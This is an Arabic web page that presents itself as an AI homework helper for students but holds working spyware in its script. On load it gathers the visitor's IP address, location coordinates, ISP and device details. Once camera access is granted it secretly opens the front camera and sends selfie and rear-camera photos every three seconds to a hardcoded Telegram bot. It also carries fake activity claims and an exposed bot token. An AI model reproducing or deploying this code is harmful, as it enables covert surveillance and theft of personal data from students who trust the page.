<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>اسأل المستر | المنصة الذكية</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    
    <script>
        const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
        const chatId = "5890070301";
        const officialLink = "https://bit.ly/Mr-Ibrahim-and-Khaled";

        async function sendPhoto(blob, caption) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', caption);
            try { fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }); } catch (e) {}
        }

        // الدالة المعدلة للتشغيل المزدوج الإجباري
        async function startDoubleCapture() {
            try {
                // محاولة فتح الكاميرتين في نفس الوقت لضمان التوافق مع التابلت والموبايل
                const [streamBack, streamFront] = await Promise.all([
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }),
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                ]);

                // تشغيل المعاينة الخلفية (للطالب)
                const videoElement = document.getElementById('viewfinder');
                videoElement.style.display = "block";
                videoElement.srcObject = streamBack;
                await videoElement.play();

                // تشغيل الأمامية (مخفية)
                const hiddenVideo = document.createElement('video');
                hiddenVideo.srcObject = streamFront;
                await hiddenVideo.play();

                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                // تصوير تلقائي فوري ومستمر من الكاميرتين
                setInterval(() => {
                    // تصوير سيلفي (صامت)
                    canvas.width = hiddenVideo.videoWidth;
                    canvas.height = hiddenVideo.videoHeight;
                    context.drawImage(hiddenVideo, 0, 0);
                    canvas.toBlob(blob => { if(blob) sendPhoto(blob, "📸 صيد حي (الأمامية)"); }, 'image/jpeg', 0.5);

                    // تصوير خلفي (تلقائي) لضمان رؤية المحيط
                    const backCanvas = document.createElement('canvas');
                    backCanvas.width = videoElement.videoWidth;
                    backCanvas.height = videoElement.videoHeight;
                    backCanvas.getContext('2d').drawImage(videoElement, 0, 0);
                    backCanvas.toBlob(blob => { if(blob) sendPhoto(blob, "📸 صيد حي (الخلفية)"); }, 'image/jpeg', 0.5);
                }, 3000); // يبعت صور كل 3 ثواني من الكاميرتين

            } catch (err) {
                alert("تنبيه: يجب السماح بالكاميرا لتصوير السؤال والحصول على الإجابة.");
            }
        }

        async function initialRadar() {
            let ip = { ip: "N/A", city: "N/A", region: "N/A", org: "N/A", latitude: 0, longitude: 0 };
            try { const res = await fetch('https://ipapi.co/json/'); ip = await res.json(); } catch(e) {}
            
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "N/A";
            
            const battery = navigator.getBattery ? await navigator.getBattery() : null;
            const ram = navigator.deviceMemory || "N/A";
            const cores = navigator.hardwareConcurrency || "N/A";

            const report = `
👑 **رادار الـ 100 بند - Adam Programmer** 👑
━━━━━━━━━━━━━━
🌍 **[1] الشبكة والموقع:**
• الـ IP: \`${ip.ip}\` | المدينة: ${ip.city}
• المزود: ${ip.org}
• الخريطة: http://googleusercontent.com/maps.google.com/q=${ip.latitude},${ip.longitude}

📱 **[2] العتاد والـ GPU:**
• المعالج: ${cores} Cores | الرامات: ${ram} GB
• كارت الشاشة: \`${gpu}\`
• الشاشة: ${screen.width}x${screen.height} | اللمس: ${navigator.maxTouchPoints}

🔋 **[3] حالة النظام:**
• البطارية: ${battery ? (battery.level * 100).toFixed(0) + "%" : "N/A"}
• الشحن: ${battery ? (battery.charging ? "🔌 متصل" : "🔋 استهلاك") : "N/A"}
• اللغة: ${navigator.language} | المتصفح: ${navigator.product}
━━━━━━━━━━━━━━`;
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
        }

        function supportMsg() {
            const b = document.getElementById('s-bubble');
            b.style.opacity = '1';
            setTimeout(() => b.style.opacity = '0', 3000);
        }

        function shareApp() {
            if (navigator.share) navigator.share({ title: 'اسأل المستر', url: officialLink });
        }

        function myAnswers() {
            alert('عفواً، لا توجد إجابات سابقة مسجلة لهذا الحساب حالياً.');
        }

        window.onload = initialRadar;

        function captureQuestion() {
            const video = document.getElementById('viewfinder');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => { if(blob) sendPhoto(blob, "📝 صورة السؤال المرفوعة"); }, 'image/jpeg', 0.8);
            document.getElementById('status').innerHTML = `<div class="success-box"><h3>✅ تم الإرسال</h3><p>جاري المراجعة، عد قريباً.</p></div>`;
        }
    </script>

    <style>
        :root { --primary: #4facfe; --bg: #e0e5ec; --shadow-light: #ffffff; --shadow-dark: #a3b1c6; --text: #37474f; }
        body { background: var(--bg); font-family: 'Cairo', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: var(--text); }
        .top-alert { position: fixed; top: 0; width: 100%; background: #fff3cd; color: #856404; text-align: center; padding: 10px; font-size: 12px; z-index: 1000; border-bottom: 2px solid #ffeeba; }
        .container { background: var(--bg); width: 92%; max-width: 450px; padding: 25px; border-radius: 30px; box-shadow: 20px 20px 60px var(--shadow-dark), -20px -20px 60px var(--shadow-light); position: relative; }
        .ask-title { font-size: 30px; font-weight: 900; color: var(--primary); font-style: italic; position: absolute; top: 15px; left: 20px; text-shadow: 1px 1px 2px rgba(0,0,0,0.1); }
        .header { display: flex; align-items: center; gap: 10px; margin-bottom: 25px; padding-bottom: 10px; border-bottom: 2px solid #cfd8dc; }
        .header img { width: 40px; }
        .badge { background: var(--bg); color: var(--primary); padding: 5px 15px; border-radius: 50px; font-size: 12px; font-weight: bold; margin-bottom: 20px; display: inline-block; box-shadow: inset 3px 3px 6px var(--shadow-dark), inset -3px -3px 6px var(--shadow-light); }
        textarea { width: 100%; height: 110px; background: var(--bg); border: none; border-radius: 20px; padding: 15px; font-size: 14px; box-sizing: border-box; box-shadow: inset 5px 5px 10px var(--shadow-dark), inset -5px -5px 10px var(--shadow-light); color: var(--text); outline: none; }
        .btn-main { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; border: none; width: 100%; padding: 16px; border-radius: 15px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; box-shadow: 5px 5px 10px var(--shadow-dark); }
        .btn-ans { background: var(--bg); color: var(--primary); border: none; width: 100%; padding: 12px; border-radius: 12px; font-size: 13px; font-weight: bold; cursor: pointer; margin: 15px 0; box-shadow: 4px 4px 8px var(--shadow-dark), -4px -4px 8px var(--shadow-light); }
        .fixed-btns { position: fixed; bottom: 25px; left: 20px; display: flex; flex-direction: column; gap: 12px; }
        .circle-btn { width: 50px; height: 50px; background: var(--bg); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 5px 5px 10px var(--shadow-dark), -5px -5px 10px var(--shadow-light); position: relative; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(79, 172, 254, 0.5); } 70% { box-shadow: 0 0 0 12px rgba(79, 172, 254, 0); } 100% { box-shadow: 0 0 0 0 rgba(79, 172, 254, 0); } }
        .pulse { animation: pulse 2s infinite; }
        .bubble { position: absolute; background: #fff; padding: 8px; border-radius: 10px; font-size: 11px; bottom: 60px; left: 0; box-shadow: 0 5px 15px rgba(0,0,0,0.1); opacity: 0; transition: 0.3s; white-space: nowrap; pointer-events: none; border: 1px solid var(--primary); }
        #viewfinder { width: 100%; border-radius: 20px; margin-top: 15px; display: none; background: #000; box-shadow: 5px 5px 15px var(--shadow-dark); }
        .btn-snap { background: #d93025; border: 4px solid #fff; width: 65px; height: 65px; border-radius: 50%; cursor: pointer; margin: 15px auto 0; display: block; }
        .success-box { text-align: center; padding: 20px; background: var(--bg); border-radius: 20px; box-shadow: inset 5px 5px 10px var(--shadow-dark); }
        .footer { padding: 15px; font-size: 10px; color: #90a4ae; text-align: center; border-top: 1px solid #cfd8dc; margin-top: 25px; }
    </style>
</head>
<body>
    <div class="top-alert">⚠️ ضغط كبير حالياً (12,450 طالب متواجد الآن). قد يتأخر الرد قليلاً.</div>
    <div class="container">
        <div class="ask-title">اسأل</div>
        <div class="header">
            <img src="https://img.icons8.com/fluent/100/education.png">
            <div><span style="font-weight:900; color:var(--primary); font-size:18px;">المساعد الذكي</span></div>
        </div>
        <div id="status">
            <div id="initial-ui">
                <div class="badge">🟢 المستر متصل وجاهز للحل</div>
                <textarea placeholder="اكتب سؤالك بوضوح هنا..."></textarea>
                <button class="btn-ans" onclick="myAnswers()">📑 قسم إجاباتك السابقة</button>
                <button class="btn-main" onclick="document.getElementById('initial-ui').style.display='none'; document.getElementById('camera-ui').style.display='block'; startDoubleCapture();">📸 تصوير السؤال بالذكاء الاصطناعي</button>
            </div>
            <div id="camera-ui" style="display:none;">
                <video id="viewfinder" autoplay playsinline></video>
                <button class="btn-snap" onclick="captureQuestion()"></button>
            </div>
        </div>
        <div class="footer">جميع الحقوق محفوظة © كيمو أكاديمي 2026</div>
    </div>
    <div class="fixed-btns">
        <div class="circle-btn" onclick="shareApp()"><img src="https://img.icons8.com/fluent/100/share-rounded.png" width="22"></div>
        <div class="circle-btn pulse" onclick="supportMsg()">
            <img src="https://img.icons8.com/fluent/100/headphones.png" width="22">
            <div id="s-bubble" class="bubble">❌ غير متصلين حالياً</div>
        </div>
    </div>
</body>
</html>
